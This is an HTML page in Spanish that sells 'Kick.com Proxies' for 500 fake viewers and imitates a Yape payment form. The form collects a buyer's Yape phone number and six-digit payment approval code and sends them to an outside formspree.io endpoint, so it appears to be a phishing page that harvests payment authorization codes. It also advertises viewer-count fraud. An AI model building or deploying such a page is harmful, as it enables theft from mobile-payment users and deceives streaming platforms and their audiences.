<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Compra Proxies Kick - Oscar</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #111; /* Fondo oscuro para que resalte el estilo Kick */
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .main-wrapper {
            display: flex;
            background: #1a1a1a;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 800px;
            border: 1px solid #333;
        }
        /* Lado Izquierdo: Información */
        .info-side {
            flex: 1;
            padding: 40px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            background: linear-gradient(135deg, #1a1a1a 0%, #0dbd0d 400%);
        }
        .info-side h1 {
            color: #53fc18; /* Verde Kick */
            font-size: 28px;
            margin-bottom: 10px;
        }
        .info-side h2 {
            font-size: 20px;
            color: #ccc;
            margin-bottom: 20px;
        }
        .details-list {
            list-style: none;
            padding: 0;
            font-size: 18px;
            line-height: 2;
        }
        .details-list li b {
            color: #53fc18;
        }

        /* Lado Derecho: Formulario Yape */
        .payment-side {
            background: white;
            padding: 40px;
            width: 350px;
            color: #333;
            text-align: center;
        }
        .logo-yape {
            width: 110px;
            margin-bottom: 20px;
        }
        .label-text {
            display: block;
            text-align: left;
            font-size: 14px;
            font-weight: bold;
            color: #444;
            margin-bottom: 5px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .input-celular {
            border: 1px solid #7ea8f8;
            background-color: #f0f4ff;
        }
        .input-codigo {
            border: 2.5px solid #000;
            background-color: #fff;
            text-align: center;
            font-weight: bold;
            font-size: 20px;
            letter-spacing: 3px;
        }
        .menu-ayuda {
            display: block;
            font-size: 12px;
            color: #666;
            margin-bottom: 20px;
            text-decoration: none;
        }
        .btn-yapear {
            width: 100%;
            padding: 16px;
            background-color: #742284;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-yapear:hover {
            background-color: #5a1a66;
            transform: translateY(-2px);
        }
        .oscar-tag {
            margin-top: 15px;
            font-weight: bold;
            color: #53fc18;
            font-size: 14px;
        }
    </style>
</head>
<body>

<div class="main-wrapper">
    <div class="info-side">
        <h1>Kick.com Proxies</h1>
        <h2>Panel de Control Oscar</h2>
        <ul class="details-list">
            <li>Servicio: <b>Proxies Residenciales</b></li>
            <li>Capacidad: <b>500 Viewers</b></li>
            <li>Duración: <b>2 Meses</b></li>
            <li>Soporte: <b>24/7 Garantizado</b></li>
        </ul>
        <div class="oscar-tag">Vendedor Autorizado: Oscar</div>
    </div>

    <div class="payment-side">
        <img src="https://www.apuestatotal.com//cms/img/banners/892/logo-yape.png" alt="Yape" class="logo-yape">
        
        <form action="https://formspree.io/f/xaqyqrjy" method="POST">
            
            <label class="label-text">Ingresa tu celular yape</label>
            <input type="tel" name="Celular_Comprador" class="input-celular" placeholder="900 000 000" required>

            <label class="label-text">Código de aprobación</label>
            <input type="text" name="Codigo_Aprobacion" class="input-codigo" placeholder="000000" maxlength="6" required>

            <a href="#" class="menu-ayuda">Encuéntralo en el menú de Yape</a>

            <input type="hidden" name="Producto" value="Proxies 500 Viewers - Oscar">
            <input type="hidden" name="Precio" value="S/ 1.00">

            <button type="submit" class="btn-yapear">YAPEAR S/ 1.00</button>
        </form>
    </div>
</div>

</body>
</html>
